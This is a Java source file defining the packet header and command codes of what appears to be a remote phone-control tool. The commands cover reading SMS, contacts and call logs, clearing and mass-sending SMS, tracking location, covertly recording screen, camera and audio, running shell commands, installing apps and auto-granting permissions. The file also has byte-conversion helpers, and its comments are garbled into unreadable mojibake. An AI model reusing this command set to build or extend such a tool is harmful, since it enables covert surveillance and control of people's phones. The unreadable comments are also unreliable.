package order;

import java.io.UnsupportedEncodingException;

/**
 * @author byc:Э���ʽ����ͷ+����+���ݳ���+������
 *
 */
public class order {
	public static final int PID = 8800;//�����ʶ(��ͷ��ʶ)��
	public static final int VER = 1001;//�汾��(��ͷ��ʶ)��
	public static final int ENC = 7618;//������(��ͷ��ʶ)��
	public static final int CMD_TEST=1000;//���ԣ�
	public static final int CMD_READY = 1001;//׼�������
	public static final int CMD_INFO = 1002;//��ȡ��Ϣ���
	public static final int CMD_CALL = 1004;//��ȡͨ����¼���
	public static final int CMD_LOCK = 1005;//�������
	public static final int CMD_SHOT = 1006;//�������
	public static final int CMD_SHOTCODE = 1007;//�ض�ά�����
	public static final int CMD_RETURN = 1008;//�������//
	public static final int CMD_POS=1009;//�������
	public static final int CMD_LIGHT=1010;//�������
	public static final int CMD_GIVE_POWER=1011;//�Զ���Ȩ����;
	public static final int CMD_CAMERA=1012;//������
	public static final int CMD_SLIDE=1013;//�������
	public static final int CMD_CMD=1014;//ִ��CMD���
	public static final int CMD_GET_CMD_OUT=1015;//��ȡִ��CMD��������
	public static final int CMD_REBOOT=1016;//�����ֻ���
	public static final int CMD_SHUTDOWN=1017;//�ػ���
	public static final int CMD_RESTART=1018;//����Ӧ�ã�
	public static final int CMD_UNLOCK=1019;//����ҵ�������
	public static final int CMD_RECORD_SCREEN_START=1020;//¼����ʼ��
	public static final int CMD_RECORD_SCREEN_END=1021;//¼��������
	public static final int CMD_RECORD_VIDEO_START=1022;//¼��ʼ��
	public static final int CMD_RECORD_VIDEO_END=1023;//¼�������
	public static final int CMD_HOME=1024;//��������
	public static final int CMD_GET_INSTALL_APP_INFO=1025;//��ȡ�Ѱ�װ��Ӧ����Ϣ��
	public static final int CMD_INSTALL_APP=1026;//��װ��
	public static final int CMD_UNINSTALL_APP=1027;//ж�أ�
	public static final int CMD_RUN_APP=1028;//���У�
	public static final int CMD_KILL_APP=1029;//��ֹ���У�
	public static final int CMD_LONG_CLICK=1030;//�������
	public static final int CMD_INPUT=1031;//���� ���
	public static final int CMD_CAMERA_CAP_START=1032;//¼��ʼ��
	public static final int CMD_CAMERA_CAP_END=1033;//¼�������
	public static final int CMD_INSERT_IMG_TO_GALLERY=1034;//��Ƭ���뵽��᣻
	public static final int CMD_SOUND_CAP_START=1035;//¼��ʼ��
	public static final int CMD_SOUND_CAP_END=1036;//¼�������
	
	
	
	public static final int CMD_LOCATION_SINGLE = 2001;//��ȡ��λ��Ϣ��
	public static final int CMD_LOCATION_SERIES = 2002;//������ȡ��λ��Ϣ��
	public static final int CMD_LOCATION_STOP = 2003;//ֹͣ��ȡ��λ��Ϣ��
	public static final int CMD_SMS_CONTENT = 3001;//��ȡ�����������
	public static final int CMD_SMS_SEND = 3002;//���Ͷ������
	public static final int CMD_SMS_PHONE_NUMBER = 3003;//��ѯ�����������
	public static final int CMD_CONTACT_CONTENT = 3004;//ͨѶ¼��
	public static final int CMD_SMS_SENDS = 3005;//Ⱥ�����ţ�
	public static final int CMD_SMS_CLEAR = 3006;//��ն��ţ�

	
	public static final int FILE_DIR_ROOT=4100;//��Ŀ¼��
	public static final int CMD_FILE_LIST = 4001;//�о�Ŀ¼�����ݾ���·����
	public static final int CMD_FILE_TRANS=4002;//�о�����SD��Ŀ¼��
	public static final int CMD_FILE_DEL=4003;//ɾ���ļ�
	
	public static final int FILE_DIR_EX_SD = 4101;//����SD��Ŀ¼��־;
	public static final int FILE_DIR_SD = 4102;//����SD��Ŀ¼��־;
	public static final int FILE_DIR_PHOTO = 4103;//���Ŀ¼;
	
	public static final int PH_SIZE=24;
	public static final int DATA_SIZE=1024;//�����建���С��
	public static final int MAX_PATH=260;//Ŀ¼���ȴ�С��
	public static final int MAX_FILE_NAME=64;//�ļ������ȣ�
	public static final int MAX_TIME_STR=24;//ʱ���ַ������ȣ�
	//public static byte[] PackageHeader= new byte[PH_SIZE];//��ͷ����ʶ+����+���ݳ���;
	//public static byte[] b = {0,0,0,0};//����
	//public static byte[] data = new byte[DATA_SIZE];//�����建��
	//public static byte[] pdata = null;//�����建��
	//public static OrderHeader oh=new OrderHeader();//����ͷ
	
	public static byte[] toLH(int n) {
		byte[] b = {0,0,0,0};
		b[0] = (byte) (n & 0xff);
		b[1] = (byte) (n >> 8 & 0xff);
		b[2] = (byte) (n >> 16 & 0xff);
		b[3] = (byte) (n >> 24 & 0xff);
		return b;
	}
	public static int byteToInt(byte[] byteVal) {
		int result = 0;
		for (int i = 0; i < byteVal.length; i++) {
			int tmpVal = (byteVal[i] << (8 * (3 - i)));
			switch (i) {
			case 0:
				tmpVal = tmpVal & 0xFF000000;
				break;
			case 1:
				tmpVal = tmpVal & 0x00FF0000;
				break;
			case 2:
				tmpVal = tmpVal & 0x0000FF00;
				break;
			case 3:
				tmpVal = tmpVal & 0x000000FF;
				break;
			}
			result = result | tmpVal;
		}
		return result;
	}
	/*
	 * ��
	 */
	public static byte[] double2Bytes(double d) {  
        long value = Double.doubleToRawLongBits(d);  
        byte[] byteRet = new byte[8];  
        for (int i = 0; i < 8; i++) {  
            byteRet[i] = (byte) ((value >> 8 * i) & 0xff);  
        }  
        return byteRet;  
    }  
	/*
	 * ��
	 */
	public static double bytes2Double(byte[] arr) {  
        long value = 0;  
        for (int i = 0; i < 8; i++) {  
            value |= ((long) (arr[i] & 0xff)) << (8 * i);  
        }  
        return Double.longBitsToDouble(value);  
    }  
	//*********************************************************************************************
	/*
	 * ������ͷ��ʽ��Ϊ�ֽ�����
	 */
	public static byte[] formatOHtoPH(OrderHeader oh,byte[] ph){
		byte[] temp = {0,0,0,0};
		//byte[] PackageHeader=new byte[PH_SIZE];
		// add ID
		temp =toLH(oh.pid);
		System.arraycopy(temp, 0, ph, 0, 4);
		// add ver
		temp =toLH(oh.ver);
		System.arraycopy(temp, 0, ph, 4, 4);
		// add ver
		temp =toLH(oh.enc);
		System.arraycopy(temp, 0, ph, 8, 4);
		// add cmd
		temp =toLH(oh.cmd);
		System.arraycopy(temp, 0, ph,12, 4);
		// add cmd
		temp =toLH(oh.len);
		System.arraycopy(temp, 0, ph,16, 4);
		// add cmd
		temp =toLH(oh.dat);
		System.arraycopy(temp, 0, ph,20, 4);
		return ph;
	}
	/*
	 * ���ֽ�����ʽ��Ϊ��ͷ��
	 */
	public static  OrderHeader formatPHtoOH(byte[] ph,OrderHeader oh){
		byte[] b = {0,0,0,0};
		//OrderHeader oh=new OrderHeader();
		int cForm;
		System.arraycopy(ph, 0, b,0, 4);
		cForm = byteToInt(b);
		oh.pid= byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 4, b,0, 4);
		cForm = byteToInt(b);
		oh.ver= byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 8, b,0, 4);
		cForm = byteToInt(b);
		oh.enc= byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 12, b,0, 4);
		cForm = byteToInt(b);
		oh.cmd=byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 16, b,0, 4);
		cForm = byteToInt(b);
		oh.len=byteToInt(toLH(cForm));
		
		System.arraycopy(ph, 20, b,0, 4);
		cForm = byteToInt(b);
		oh.dat=byteToInt(toLH(cForm));
		return oh;
	}
	/*
	 * ����׼���������ͷ��
	 */
	public static byte[] CreateReadyPH(OrderHeader oh,byte[] ph){
		//OrderHeader oh=new OrderHeader();
		oh.pid=PID;
		oh.ver=VER;
		oh.enc=ENC;
		oh.cmd=CMD_READY;
		oh.len=0;
		return formatOHtoPH(oh,ph);
	}
	/*
	 * У������ͷ��
	 */
	public static boolean VerifyOH(OrderHeader oh){
		boolean b=true;
		if(oh.pid!=PID)b=false;
		if(oh.ver!=VER)b=false;
		if(oh.enc!=ENC)b=false;
		return b;
	}
	/*
	 * ��ʽ������ͷ��
	 */
	public static OrderHeader formatOH(OrderHeader oh){
		oh.pid=PID;
		oh.ver=VER;
		oh.enc=ENC;
		oh.cmd=CMD_READY;
		oh.len=0;
		oh.dat=0;
		return oh;
	}
	/*
	 * ���ֽ�����ʽ��Ϊ���ͣ�
	 */
	public static  int byte2Int(byte[] b){
		int cForm;
		cForm = byteToInt(b);
		return byteToInt(toLH(cForm));
	}
	/*
	 * ���ֽ�����ʽ��Ϊ�ַ�����
	 */
	public static  String byte2Str(byte[] b){
		try{
			//String s=new String(b, "UTF-8");
			String s=new String(b, "gbk");
			return s;
		}catch(UnsupportedEncodingException e){
			e.printStackTrace();
			return null;
		}
	}
}
